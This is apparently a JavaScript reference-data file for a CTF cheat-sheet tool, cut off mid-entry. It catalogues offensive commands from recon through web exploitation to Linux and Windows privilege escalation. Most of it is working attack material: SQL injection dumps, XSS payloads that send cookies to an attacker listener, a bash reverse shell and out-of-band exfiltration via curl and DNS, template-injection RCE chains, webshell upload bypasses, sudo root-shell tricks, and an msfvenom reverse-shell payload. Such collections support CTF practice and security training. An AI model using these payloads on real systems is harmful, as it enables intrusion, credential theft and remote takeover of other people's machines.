/* ============================================================
   CTF Helper — reference data

   Shape:
     category { id, title, emoji, desc, groups[] }
     group    { id, title, note?, type?, items[] }
     item     { cmd, desc, tags[] }

   Placeholders used across commands:
     LHOST  attacker IP        RHOST  target IP / host
     LPORT  listener port      URL    target URL
   ============================================================ */

const CTF_DATA = [
  /* ========================================================
     RECON & ENUMERATION
     ======================================================== */
  {
    id: "recon",
    title: "Recon & Enumeration",
    emoji: "📡",
    desc: "Map the attack surface before touching anything else. Ports, services, web content, subdomains, DNS.",
    groups: [
      {
        id: "nmap",
        title: "nmap",
        note: "Start with a fast full-port sweep, then run a deep script/version scan only on the ports that answered.",
        items: [
          { cmd: "nmap -p- --min-rate 5000 -T4 -Pn RHOST -oN nmap/allports.txt", desc: "Fast scan of all 65535 TCP ports. Grab open ports first, scan deep after.", tags: ["nmap", "tcp", "full", "ports"] },
          { cmd: "nmap -sC -sV -p 22,80,445 -oA nmap/deep RHOST", desc: "Default NSE scripts + service/version detection on known-open ports. All output formats.", tags: ["nmap", "version", "scripts", "sv", "sc"] },
          { cmd: "nmap -sU --top-ports 100 -T4 -oN nmap/udp.txt RHOST", desc: "UDP scan of the top 100 ports (SNMP, DNS, TFTP, IKE often live here).", tags: ["nmap", "udp"] },
          { cmd: "nmap -p- -sV -A -T4 --script vuln -oN nmap/vuln.txt RHOST", desc: "Aggressive scan with OS detection, traceroute and the vuln NSE category.", tags: ["nmap", "vuln", "aggressive", "os"] },
          { cmd: "nmap -Pn -sS -p- --open -T4 RHOST", desc: "SYN stealth scan, skip host discovery (-Pn), only show open ports.", tags: ["nmap", "syn", "stealth", "pn"] },
          { cmd: "nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery RHOST", desc: "SMB enumeration: shares, users and OS fingerprint via NSE.", tags: ["nmap", "smb", "nse", "445"] },
          { cmd: "nmap -p 80,443 --script http-enum,http-title,http-headers RHOST", desc: "HTTP enumeration scripts: common paths, page titles, response headers.", tags: ["nmap", "http", "nse", "web"] },
          { cmd: "nmap -p 53 --script dns-nsid,dns-recursion RHOST", desc: "DNS server fingerprint and open-recursion check.", tags: ["nmap", "dns", "53"] },
          { cmd: "nmap --script ssl-enum-ciphers -p 443 RHOST", desc: "Enumerate supported TLS versions and cipher suites with letter grades.", tags: ["nmap", "ssl", "tls", "ciphers"] },
          { cmd: "locate .nse | xargs grep -l 'categories' | head; ls /usr/share/nmap/scripts/ | grep KEYWORD", desc: "Find NSE scripts for a service by keyword (e.g. ftp, smb, http, oracle).", tags: ["nmap", "nse", "scripts", "list"] }
        ]
      },
      {
        id: "webcontent",
        title: "Web Content Discovery",
        note: "Directory, file and vhost fuzzing. Always set extensions to match the stack (.php for PHP, .aspx for IIS). SecLists lives at /usr/share/seclists.",
        items: [
          { cmd: "gobuster dir -u URL -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -o gobuster.txt", desc: "Classic directory brute force with 50 threads.", tags: ["gobuster", "dir", "fuzz", "web"] },
          { cmd: "gobuster dir -u URL -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -x php,txt,bak,zip,old -t 50", desc: "File fuzzing with common extensions including backup files.", tags: ["gobuster", "files", "extensions", "backup"] },
          { cmd: "gobuster vhost -u http://DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain", desc: "Virtual-host fuzzing — finds name-based vhosts on the same IP.", tags: ["gobuster", "vhost", "virtualhost"] },
          { cmd: "ffuf -u URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,204,301,302,307,401,403 -o ffuf.json", desc: "ffuf directory fuzz, matching useful status codes.", tags: ["ffuf", "dir", "fuzz", "mc"] },
          { cmd: "ffuf -u URL -H 'Host: FUZZ.DOMAIN' -w wordlist.txt -fs 0 -ac", desc: "Vhost fuzz via Host header with auto-calibration; filter the default page size.", tags: ["ffuf", "vhost", "host", "autocalibrate"] },
          { cmd: "ffuf -u 'URL/?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0 -ac", desc: "Hidden GET parameter discovery by filtering the baseline size.", tags: ["ffuf", "parameter", "param", "hidden"] },
          { cmd: "ffuf -u URL/FUZZ -w list.txt -recursion -recursion-depth 2 -e .php,.html", desc: "Recursive fuzzing into discovered directories with extensions.", tags: ["ffuf", "recursion", "deep"] },
          { cmd: "feroxbuster -u URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50 --auto-tune", desc: "feroxbuster — recursive by default, auto-tunes on rate-limit/errors.", tags: ["feroxbuster", "recursive", "fast"] },
          { cmd: "ffuf -w list.txt -u URL/FUZZ -mc all -ac -c && echo 'review 403s for bypass'", desc: "Match every code then triage 403s/401s for bypass candidates.", tags: ["ffuf", "403", "triage"] }
        ]
      },
      {
        id: "fingerprint",
        title: "Tech Fingerprinting",
        items: [
          { cmd: "whatweb -a 3 URL", desc: "Aggressive tech fingerprint: server, framework, CMS, JS libs, versions.", tags: ["whatweb", "fingerprint", "tech"] },
          { cmd: "curl -sI URL", desc: "Fetch response headers only — Server, X-Powered-By, Set-Cookie reveal the stack.", tags: ["curl", "headers", "server"] },
          { cmd: "nuclei -u URL -t ~/nuclei-templates/technologies/ -t ~/nuclei-templates/http/exposures/", desc: "Template-based tech + exposure detection.", tags: ["nuclei", "tech", "exposures"] },
          { cmd: "wafw00f URL", desc: "Detect and fingerprint a Web Application Firewall before you start throwing payloads.", tags: ["wafw00f", "waf"] },
          { cmd: "curl -s URL/robots.txt; curl -s URL/sitemap.xml; curl -s URL/.well-known/security.txt", desc: "The three files that hand you paths for free. Always check first.", tags: ["robots", "sitemap", "curl", "quick"] }
        ]
      },
      {
        id: "subdomain",
        title: "Subdomain Enumeration",
        items: [
          { cmd: "subfinder -d DOMAIN -all -silent -o subs.txt", desc: "Passive subdomain discovery across all configured sources.", tags: ["subfinder", "subdomain", "passive"] },
          { cmd: "amass enum -passive -d DOMAIN -o amass.txt", desc: "Amass passive enumeration — broad OSINT source coverage.", tags: ["amass", "subdomain", "passive"] },
          { cmd: "assetfinder --subs-only DOMAIN | tee assetfinder.txt", desc: "Quick subdomain grab from assetfinder.", tags: ["assetfinder", "subdomain"] },
          { cmd: "cat subs.txt | httpx -silent -sc -title -tech-detect -o live.txt", desc: "Probe discovered hosts for live HTTP(S), capture status, title and tech.", tags: ["httpx", "probe", "live"] },
          { cmd: "ffuf -u http://DOMAIN -H 'Host: FUZZ.DOMAIN' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0", desc: "Brute-force subdomains via Host header when DNS wildcard blocks resolution.", tags: ["ffuf", "subdomain", "bruteforce"] }
        ]
      },
      {
        id: "dns",
        title: "DNS",
        items: [
          { cmd: "dig axfr @NS_IP DOMAIN", desc: "Attempt a full DNS zone transfer — a misconfigured NS dumps every record.", tags: ["dig", "axfr", "zone-transfer", "dns"] },
          { cmd: "dig ANY DOMAIN +noall +answer; dig TXT DOMAIN +short", desc: "Pull all record types / TXT records (SPF, verification tokens, hints).", tags: ["dig", "any", "txt"] },
          { cmd: "nslookup -type=AXFR DOMAIN NS_IP", desc: "Zone transfer via nslookup when dig is unavailable.", tags: ["nslookup", "axfr", "zone"] },
          { cmd: "dnsrecon -d DOMAIN -t axfr; dnsrecon -d DOMAIN -D wordlist.txt -t brt", desc: "dnsrecon zone transfer, then dictionary brute force of records.", tags: ["dnsrecon", "axfr", "brute"] },
          { cmd: "echo 'RHOST  box.htb  www.box.htb' | sudo tee -a /etc/hosts", desc: "Add discovered vhosts to /etc/hosts so the browser and tools resolve them.", tags: ["hosts", "vhost", "etc"] }
        ]
      }
    ]
  },

  /* ========================================================
     WEB EXPLOITATION
     ======================================================== */
  {
    id: "web",
    title: "Web Exploitation",
    emoji: "🕸️",
    desc: "Injection, traversal, template and upload attacks against web applications. Confirm the stack first — payloads are engine-specific.",
    groups: [
      {
        id: "sqli",
        title: "SQL Injection",
        note: "Confirm injection with a quote and a logic test before automating. Always identify the DBMS, then tailor UNION/stacked payloads.",
        items: [
          { cmd: "' OR '1'='1'-- -", desc: "Boolean auth bypass — classic always-true condition.", tags: ["sqli", "auth-bypass", "boolean", "login"] },
          { cmd: "' ORDER BY 5-- -", desc: "Column counting — increment until the query errors to find the column count.", tags: ["sqli", "union", "order-by", "columns"] },
          { cmd: "' UNION SELECT 1,2,3,4,5-- -", desc: "UNION probe — find which columns render so you can place output there.", tags: ["sqli", "union", "select"] },
          { cmd: "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -", desc: "Enumerate tables (MySQL/MSSQL/Postgres) via information_schema.", tags: ["sqli", "union", "schema", "tables", "mysql"] },
          { cmd: "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -", desc: "Enumerate columns of a target table.", tags: ["sqli", "columns", "schema"] },
          { cmd: "' UNION SELECT NULL,group_concat(user,0x3a,password),NULL FROM users-- -", desc: "Dump credentials, colon-separated, in one row.", tags: ["sqli", "dump", "credentials", "group_concat"] },
          { cmd: "' AND SLEEP(5)-- -   /   '||pg_sleep(5)--   /   ';WAITFOR DELAY '0:0:5'--", desc: "Time-based blind confirmation for MySQL / Postgres / MSSQL respectively.", tags: ["sqli", "blind", "time", "sleep"] },
          { cmd: "' AND 1=CONVERT(int,(SELECT @@version))-- -", desc: "MSSQL error-based version extraction via type-cast error.", tags: ["sqli", "error-based", "mssql", "version"] },
          { cmd: "sqlmap -u 'URL?id=1' --batch --dbs --random-agent", desc: "sqlmap: auto-detect injection, enumerate databases.", tags: ["sqlmap", "auto", "dbs"] },
          { cmd: "sqlmap -r request.txt --batch --level 5 --risk 3 --dump -T users", desc: "sqlmap from a saved Burp request, aggressive, dump the users table.", tags: ["sqlmap", "request", "dump", "level"] },
          { cmd: "sqlmap -u URL --batch --os-shell --technique=U", desc: "sqlmap OS shell via UNION technique (needs FILE/stacked-query privileges).", tags: ["sqlmap", "os-shell", "rce"] }
        ]
      },
      {
        id: "xss",
        title: "Cross-Site Scripting",
        note: "Reflected = in the response now. Stored = saved and served to others. DOM = sink in client-side JS. Test context (HTML / attribute / JS / URL) before picking a payload.",
        items: [
          { cmd: "<script>alert(document.domain)</script>", desc: "Basic reflected/stored proof. Use document.domain, not 1, to prove execution context.", tags: ["xss", "reflected", "basic", "poc"] },
          { cmd: "\"><img src=x onerror=alert(1)>", desc: "Attribute break-out — escape an attribute value then inject a tag.", tags: ["xss", "attribute", "breakout", "img"] },
          { cmd: "<svg/onload=alert(1)>", desc: "Short payload, no spaces needed, survives many naive filters.", tags: ["xss", "svg", "filter-bypass"] },
          { cmd: "javascript:alert(1)", desc: "For href/src sinks and DOM-based `location` writes.", tags: ["xss", "dom", "javascript-uri"] },
          { cmd: "<img src=x onerror=\"fetch('http://LHOST/c?='+document.cookie)\">", desc: "Cookie exfiltration PoC — sends document.cookie to your listener.", tags: ["xss", "cookie", "exfil", "steal"] },
          { cmd: "<script>new Image().src='http://LHOST/?c='+encodeURIComponent(document.cookie)</script>", desc: "Alternative cookie stealer using an Image beacon.", tags: ["xss", "cookie", "beacon", "steal"] },
          { cmd: "<sCrIpt>alert(1)</sCrIpt>  /  <scr<script>ipt>alert(1)</scr</script>ipt>", desc: "Case-mix and nested-tag bypasses for weak blacklist filters.", tags: ["xss", "filter-bypass", "waf"] },
          { cmd: "'-alert(1)-'  /  ';alert(1)//", desc: "JavaScript-context breakout when your input lands inside a <script> string.", tags: ["xss", "js-context", "breakout"] },
          { cmd: "python3 -m http.server 80   # then catch the cookie hit", desc: "Host a listener to receive stolen cookies / blind-XSS callbacks.", tags: ["xss", "listener", "catch"] }
        ]
      },
      {
        id: "lfi",
        title: "LFI / RFI & Path Traversal",
        note: "Local File Inclusion reads/executes server files; Remote adds a URL. PHP wrappers turn a read into source disclosure or RCE.",
        items: [
          { cmd: "../../../../etc/passwd", desc: "Basic path traversal to read /etc/passwd. Add more ../ until it resolves.", tags: ["lfi", "traversal", "passwd"] },
          { cmd: "....//....//....//etc/passwd", desc: "Bypass naive `../` stripping with doubled sequences.", tags: ["lfi", "traversal", "bypass", "filter"] },
          { cmd: "..%2f..%2f..%2fetc%2fpasswd   /   ..%252f..%252f   (double-encode)", desc: "URL / double-URL encoding to slip past input filters and WAFs.", tags: ["lfi", "encoding", "bypass", "waf"] },
          { cmd: "php://filter/convert.base64-encode/resource=index.php", desc: "Read PHP source as base64 instead of executing it — disclose config/creds.", tags: ["lfi", "php-filter", "source", "wrapper"] },
          { cmd: "php://filter/convert.base64-encode/resource=../config.php", desc: "Pull application config files (DB creds) via the base64 wrapper.", tags: ["lfi", "php-filter", "config", "creds"] },
          { cmd: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", desc: "data:// wrapper — embeds `<?php system($_GET['c']);?>` for direct RCE.", tags: ["lfi", "data-wrapper", "rce"] },
          { cmd: "php://input   (POST body: <?php system('id'); ?>)", desc: "php://input executes a PHP payload sent in the POST body.", tags: ["lfi", "php-input", "rce", "post"] },
          { cmd: "expect://id   /   zip://shell.zip%23shell.php", desc: "Less-common wrappers for command execution when enabled.", tags: ["lfi", "expect", "zip", "wrapper"] },
          { cmd: "/var/log/apache2/access.log   (poison User-Agent: <?php system($_GET['c']);?>)", desc: "Log poisoning — inject PHP via a header, then include the log to execute it.", tags: ["lfi", "log-poison", "rce", "apache"] },
          { cmd: "/proc/self/environ   /   /proc/self/fd/N", desc: "Include process environment / file descriptors for alternative RCE or leaks.", tags: ["lfi", "proc", "environ", "rce"] }
        ]
      },
      {
        id: "ssrf",
        title: "SSRF",
        note: "Server-Side Request Forgery: make the server fetch a URL you control. Prize targets are cloud metadata and internal-only services.",
        items: [
          { cmd: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", desc: "AWS IMDSv1 metadata — role name, then append it to dump temporary keys.", tags: ["ssrf", "aws", "metadata", "cloud", "iam"] },
          { cmd: "http://metadata.google.internal/computeMetadata/v1/   (Header: Metadata-Flavor: Google)", desc: "GCP metadata endpoint — requires the Metadata-Flavor header.", tags: ["ssrf", "gcp", "metadata", "cloud"] },
          { cmd: "http://169.254.169.254/metadata/instance?api-version=2021-02-01   (Header: Metadata: true)", desc: "Azure instance metadata service.", tags: ["ssrf", "azure", "metadata", "cloud"] },
          { cmd: "http://127.0.0.1:80/   http://localhost/   http://[::1]/", desc: "Hit internal services. Try loopback variants when one is blacklisted.", tags: ["ssrf", "localhost", "internal"] },
          { cmd: "http://127.1/   http://2130706433/   http://0x7f000001/   http://0177.0.0.1/", desc: "Localhost obfuscation: short-form, decimal, hex and octal IP encodings.", tags: ["ssrf", "bypass", "encoding", "localhost"] },
          { cmd: "http://evil.com@127.0.0.1/   /   http://127.0.0.1#@evil.com/", desc: "URL userinfo/fragment confusion to defeat allow-list parsers.", tags: ["ssrf", "bypass", "parser", "url"] },
          { cmd: "http://RHOST/?url=http://LHOST:8000/   (then watch python3 -m http.server)", desc: "Confirm blind SSRF with a callback to your own listener.", tags: ["ssrf", "blind", "callback", "confirm"] },
          { cmd: "gopher://127.0.0.1:6379/_SET%20x%20y   (Redis via gopher)", desc: "gopher:// smuggles raw bytes — pivot SSRF into Redis/SMTP/internal protocols.", tags: ["ssrf", "gopher", "redis", "protocol"] }
        ]
      },
      {
        id: "ssti",
        title: "SSTI",
        note: "Server-Side Template Injection. First confirm with `${7*7}` / `{{7*7}}`; a 49 means injection. Then fingerprint the engine and escalate to RCE.",
        items: [
          { cmd: "{{7*7}}   ${7*7}   #{7*7}   {{7*'7'}}", desc: "Detection probes — which one returns 49 (or 7777777) tells you the engine family.", tags: ["ssti", "detect", "confirm"] },
          { cmd: "{{config}}   {{config.items()}}", desc: "Jinja2 confirmation — leaks the Flask config object (often contains SECRET_KEY).", tags: ["ssti", "jinja2", "flask", "config"] },
          { cmd: "{{''.__class__.__mro__[1].__subclasses__()}}", desc: "Jinja2 — enumerate Python subclasses to find one wrapping subprocess/os.", tags: ["ssti", "jinja2", "python", "subclasses"] },
          { cmd: "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}", desc: "Jinja2 RCE one-liner via the cycler globals chain.", tags: ["ssti", "jinja2", "rce", "python"] },
          { cmd: "{{ lipsum.__globals__['os'].popen('id').read() }}", desc: "Shorter Jinja2 RCE using lipsum's module globals.", tags: ["ssti", "jinja2", "rce"] },
          { cmd: "{{['id']|filter('system')}}   /   {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", desc: "Twig (PHP) RCE payloads.", tags: ["ssti", "twig", "php", "rce"] },
          { cmd: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", desc: "FreeMarker (Java) RCE via the Execute utility class.", tags: ["ssti", "freemarker", "java", "rce"] },
          { cmd: "#set($x=$rt.getRuntime().exec('id'))   (Velocity, via ClassTool)", desc: "Velocity (Java) RCE pattern — reach Runtime through reflection utilities.", tags: ["ssti", "velocity", "java", "rce"] }
        ]
      },
      {
        id: "upload",
        title: "File Upload Bypass",
        note: "Goal is usually a web shell. Fight extension, content-type and magic-byte checks one at a time.",
        items: [
          { cmd: "shell.php  →  shell.phtml / .php3 / .php5 / .phar / .pht", desc: "Alternate PHP extensions that the interpreter still executes but blacklists miss.", tags: ["upload", "extension", "php", "bypass"] },
          { cmd: "shell.php%00.jpg   /   shell.php.jpg   /   shell.jpg.php", desc: "Null-byte and double-extension tricks against naive extension checks.", tags: ["upload", "double-extension", "nullbyte"] },
          { cmd: "Content-Type: image/jpeg   (while body is PHP)", desc: "Spoof the MIME type in the request to pass content-type validation.", tags: ["upload", "content-type", "mime", "bypass"] },
          { cmd: "GIF89a;<?php system($_GET['c']); ?>", desc: "Prepend magic bytes so file(1)/getimagesize see a valid GIF.", tags: ["upload", "magic-bytes", "polyglot", "gif"] },
          { cmd: "exiftool -Comment='<?php system($_GET[\"c\"]); ?>' image.jpg", desc: "Hide PHP in EXIF metadata of a genuine image for picky validators.", tags: ["upload", "exif", "metadata", "image"] },
          { cmd: ".htaccess  →  AddType application/x-httpd-php .jpg", desc: "Upload an .htaccess that makes the server execute your .jpg as PHP.", tags: ["upload", "htaccess", "apache", "bypass"] },
          { cmd: "shell.aspx / .asp / .config   (IIS)   |   shell.jsp / .jspx (Tomcat)", desc: "Platform-appropriate shell extensions for IIS and Java servers.", tags: ["upload", "iis", "aspx", "jsp"] }
        ]
      },
      {
        id: "cmdi",
        title: "Command Injection",
        note: "Confirm with a benign command, then read output or go blind via a time delay / OOB callback.",
        items: [
          { cmd: "; id   |   | id   |   & id   |   && id   |   `id`   |   $(id)", desc: "Command separators — try each; some filters only block one or two.", tags: ["cmdi", "separator", "inject"] },
          { cmd: "; ping -c 4 LHOST   (watch with: tcpdump -i tun0 icmp)", desc: "Blind confirmation via ICMP callback to your box.", tags: ["cmdi", "blind", "icmp", "callback"] },
          { cmd: "; sleep 5   /   & timeout 5", desc: "Time-based blind confirmation (Linux / Windows).", tags: ["cmdi", "blind", "time", "sleep"] },
          { cmd: "; curl http://LHOST/$(whoami)   /   ; nslookup `whoami`.LHOST", desc: "Out-of-band exfiltration of command output via HTTP/DNS.", tags: ["cmdi", "oob", "exfil", "dns"] },
          { cmd: "cat${IFS}/etc/passwd   /   {cat,/etc/passwd}   /   ca\\t /etc/passwd", desc: "Space and keyword bypasses: $IFS, brace expansion, backslash splitting.", tags: ["cmdi", "bypass", "space", "ifs", "waf"] },
          { cmd: ";bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'", desc: "Chain injection straight into a reverse shell.", tags: ["cmdi", "revshell", "chain"] }
        ]
      },
      {
        id: "cms",
        title: "CMS Paths & Endpoints",
        note: "Identify the CMS, enumerate version + plugins, then target known-vulnerable components.",
        items: [
          { cmd: "wpscan --url URL --enumerate u,ap,at --api-token TOKEN", desc: "WordPress: enumerate users, all plugins and themes with vuln data.", tags: ["wordpress", "wpscan", "plugins", "users"] },
          { cmd: "URL/wp-login.php   /wp-admin/   /wp-json/wp/v2/users   /xmlrpc.php", desc: "WordPress key endpoints — the REST users route leaks usernames unauthenticated.", tags: ["wordpress", "endpoints", "wp-json", "xmlrpc"] },
          { cmd: "URL/administrator/   /   droopescan scan joomla -u URL", desc: "Joomla admin panel + version/extension scan.", tags: ["joomla", "droopescan", "admin"] },
          { cmd: "URL/user/login   /user/register   /CHANGELOG.txt   |   droopescan scan drupal -u URL", desc: "Drupal login/register, version via CHANGELOG, and a focused scan.", tags: ["drupal", "droopescan", "version"] },
          { cmd: "URL/CHANGELOG.txt   /README.md   /VERSION   /composer.lock", desc: "Version-leaking files common to many CMS/frameworks — map to CVEs.", tags: ["cms", "version", "changelog", "cve"] }
        ]
      }
    ]
  },

  /* ========================================================
     LINUX PRIVILEGE ESCALATION
     ======================================================== */
  {
    id: "linpriv",
    title: "Linux Privilege Escalation",
    emoji: "🐧",
    desc: "Enumerate first, exploit second. Most Linux privesc is a misconfiguration you can find by looking — SUID, sudo, cron, capabilities, writable paths.",
    groups: [
      {
        id: "linenum",
        title: "Manual Enumeration Checklist",
        note: "Run these in order. Each line answers a specific privesc question. Pipe anything odd into GTFOBins.",
        items: [
          { cmd: "id; sudo -l; whoami; hostname; cat /etc/os-release", desc: "Who am I, what can I sudo, and which distro/kernel am I on.", tags: ["linpriv", "enum", "sudo", "id"] },
          { cmd: "find / -perm -4000 -type f 2>/dev/null", desc: "Find SUID binaries — a non-standard one is often the whole box.", tags: ["linpriv", "suid", "find", "4000"] },
          { cmd: "find / -perm -2000 -type f 2>/dev/null", desc: "Find SGID binaries.", tags: ["linpriv", "sgid", "find", "2000"] },
          { cmd: "getcap -r / 2>/dev/null", desc: "List file capabilities — cap_setuid on python/perl/tar is instant root.", tags: ["linpriv", "capabilities", "getcap", "cap_setuid"] },
          { cmd: "cat /etc/crontab; ls -la /etc/cron.*; crontab -l; cat /var/spool/cron/crontabs/* 2>/dev/null", desc: "Cron jobs — a writable script run as root is a clean path up.", tags: ["linpriv", "cron", "crontab", "scheduled"] },
          { cmd: "echo $PATH; ls -la /usr/local/bin /usr/local/sbin", desc: "Check PATH ordering — a writable early directory enables binary hijacking.", tags: ["linpriv", "path", "hijack"] },
          { cmd: "find / -writable -type d 2>/dev/null; find / -perm -o+w -type f 2>/dev/null | grep -v /proc", desc: "World-writable directories and files — targets for cron/service/config abuse.", tags: ["linpriv", "writable", "world"] },
          { cmd: "systemctl list-units --type=service; ls -la /etc/systemd/system/ /lib/systemd/system/", desc: "Enumerate services; a writable unit file or ExecStart script escalates.", tags: ["linpriv", "service", "systemd", "writable"] },
          { cmd: "cat /etc/exports 2>/dev/null; showmount -e RHOST", desc: "NFS exports — no_root_squash lets you plant a root-owned SUID binary.", tags: ["linpriv", "nfs", "no_root_squash", "exports"] },
          { cmd: "id | grep -q docker && docker run -v /:/mnt --rm -it alpine chroot /mnt sh", desc: "Docker group membership = root: mount the host filesystem and chroot in.", tags: ["linpriv", "docker", "group", "chroot"] },
          { cmd: "cat /etc/passwd; ls -la /home/*; find / -name '*.bak' -o -name 'id_rsa' 2>/dev/null", desc: "Users, home contents, backups and SSH keys lying around.", tags: ["linpriv", "passwd", "ssh", "keys", "backup"] },
          { cmd: "env; cat ~/.bash_history /root/.bash_history 2>/dev/null; history", desc: "Environment and shell history frequently leak passwords and commands.", tags: ["linpriv", "history", "env", "creds"] }
        ]
      },
      {
        id: "sudo",
        title: "sudo -l Abuse",
        note: "For every allowed binary, the escalation method is the point — not just the GTFOBins link. Run `sudo -l` and map each entry.",
        items: [
          { cmd: "sudo /usr/bin/find . -exec /bin/sh \\; -quit", desc: "find with sudo spawns a root shell via -exec.", tags: ["sudo", "gtfobins", "find", "shell"] },
          { cmd: "sudo vim -c ':!/bin/sh'   /   sudo less /etc/profile  then  !/bin/sh", desc: "Editors/pagers shell out: vim's :! and less's ! both drop to root sh.", tags: ["sudo", "vim", "less", "shell"] },
          { cmd: "sudo awk 'BEGIN {system(\"/bin/sh\")}'", desc: "awk's system() runs a root shell.", tags: ["sudo", "awk", "system"] },
          { cmd: "sudo env /bin/sh   /   sudo perl -e 'exec \"/bin/sh\";'", desc: "env and perl both execute an arbitrary program as root.", tags: ["sudo", "env", "perl"] },
          { cmd: "sudo LD_PRELOAD=/tmp/x.so BINARY   (when 'env_keep+=LD_PRELOAD' is set)", desc: "LD_PRELOAD abuse when sudoers preserves it — load a root-run shared object.", tags: ["sudo", "ld_preload", "env_keep"] },
          { cmd: "sudo -u#-1 /bin/bash   (CVE-2019-14287)", desc: "sudo runas -1 bypass — treated as UID 0 on vulnerable versions.", tags: ["sudo", "cve-2019-14287", "bypass"] },
          { cmd: "sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')   (CVE-2021-3156 Baron Samedit)", desc: "Heap overflow in sudo < 1.9.5p2 — check version, use a precompiled exploit.", tags: ["sudo", "cve-2021-3156", "baron-samedit", "overflow"] }
        ]
      },
      {
        id: "kernel",
        title: "Kernel & Version Exploits",
        note: "Last resort — kernel exploits can crash the box. Confirm the version maps cleanly to a known, reliable exploit first.",
        items: [
          { cmd: "uname -a; cat /proc/version; cat /etc/os-release", desc: "Capture exact kernel and distro version strings to search against.", tags: ["kernel", "uname", "version"] },
          { cmd: "searchsploit linux kernel 5.4 | grep -i 'local priv'", desc: "Cross-reference the kernel version against Exploit-DB locally.", tags: ["kernel", "searchsploit", "exploit-db"] },
          { cmd: "./linux-exploit-suggester.sh   /   ./les.sh", desc: "Run LES against the live kernel for ranked, likely-applicable exploits.", tags: ["kernel", "les", "suggester"] },
          { cmd: "# PwnKit CVE-2021-4034 (pkexec) — present on almost every distro for years", desc: "Check `ls -l $(which pkexec)` for SUID; PwnKit is a near-universal local root.", tags: ["kernel", "pwnkit", "cve-2021-4034", "pkexec"] },
          { cmd: "# DirtyPipe CVE-2022-0847 (kernel 5.8–5.16)   |   DirtyCow CVE-2016-5195 (older)", desc: "Two reliable, well-known kernel LPEs — match the version window before using.", tags: ["kernel", "dirtypipe", "dirtycow", "cve"] }
        ]
      },
      {
        id: "linauto",
        title: "Automated Enumeration",
        items: [
          { cmd: "curl LHOST/linpeas.sh | sh   /   ./linpeas.sh -a | tee linpeas.txt", desc: "linPEAS — the broadest automated Linux privesc scanner. Pipe to a file and read the red/yellow hits.", tags: ["linpeas", "auto", "enum"] },
          { cmd: "./pspy64 -pf -i 1000", desc: "pspy — watch processes and cron jobs run without root; reveals scheduled scripts and passwords in args.", tags: ["pspy", "process", "cron", "monitor"] },
          { cmd: "python3 -m http.server 80   # on attacker, to serve linpeas/pspy to the box", desc: "Serve your tooling to the target over HTTP for quick transfer.", tags: ["transfer", "http", "serve"] }
        ]
      }
    ]
  },

  /* ========================================================
     WINDOWS PRIVILEGE ESCALATION
     ======================================================== */
  {
    id: "winpriv",
    title: "Windows Privilege Escalation",
    emoji: "🪟",
    desc: "Service misconfigurations, stored credentials and token privileges are the common wins. Enumerate with winPEAS, then target the specific flaw.",
    groups: [
      {
        id: "winenum",
        title: "Enumeration Checklist",
        items: [
          { cmd: "whoami /priv; whoami /groups", desc: "List your privileges and groups — SeImpersonate/SeAssignPrimaryToken enable Potato attacks.", tags: ["winpriv", "whoami", "privileges", "seimpersonate"] },
          { cmd: "systeminfo; wmic qfe get HotFixID", desc: "OS build and installed patches — feed into Watson/Sherlock for missing-KB exploits.", tags: ["winpriv", "systeminfo", "patches", "hotfix"] },
          { cmd: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", desc: "AlwaysInstallElevated — if both keys are 1, any MSI runs as SYSTEM.", tags: ["winpriv", "alwaysinstallelevated", "msi", "registry"] },
          { cmd: "cmdkey /list; reg query HKLM /f password /t REG_SZ /s", desc: "Stored credentials and passwords hiding in the registry.", tags: ["winpriv", "cmdkey", "stored-creds", "registry"] },
          { cmd: "schtasks /query /fo LIST /v | findstr /i \"TaskName Run As Task To Run\"", desc: "Scheduled tasks — a writable task binary run as SYSTEM escalates.", tags: ["winpriv", "schtasks", "scheduled"] },
          { cmd: "dir /s *pass* == *.config *.xml *.ini 2>nul; findstr /si password *.txt *.ini *.config", desc: "Hunt config files and docs for plaintext credentials.", tags: ["winpriv", "creds", "findstr", "config"] }
        ]
      },
      {
        id: "winservice",
        title: "Service Misconfiguration",
        note: "Three classic flaws: unquoted service paths, weak service permissions, and weak binary permissions.",
        items: [
          { cmd: "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"", desc: "Find unquoted service paths with spaces — plant a binary in an earlier path segment.", tags: ["winpriv", "unquoted", "service", "path"] },
          { cmd: "accesschk.exe -uwcqv \"Everyone\" * /accepteula   /   accesschk.exe -uwcqv user *", desc: "Find services your user can reconfigure (SERVICE_CHANGE_CONFIG).", tags: ["winpriv", "accesschk", "service", "permissions"] },
          { cmd: "sc config SERVICE binpath= \"C:\\temp\\rev.exe\" & sc stop SERVICE & sc start SERVICE", desc: "Redirect a reconfigurable service to your payload, then restart it.", tags: ["winpriv", "sc", "binpath", "service"] },
          { cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o rev.exe", desc: "Generate the service payload to drop on the target.", tags: ["winpriv", "msfvenom", "payload", "exe"] }
        ]
      },
      {
        id: "winmsi",
        title: "AlwaysInstallElevated",
        items: [
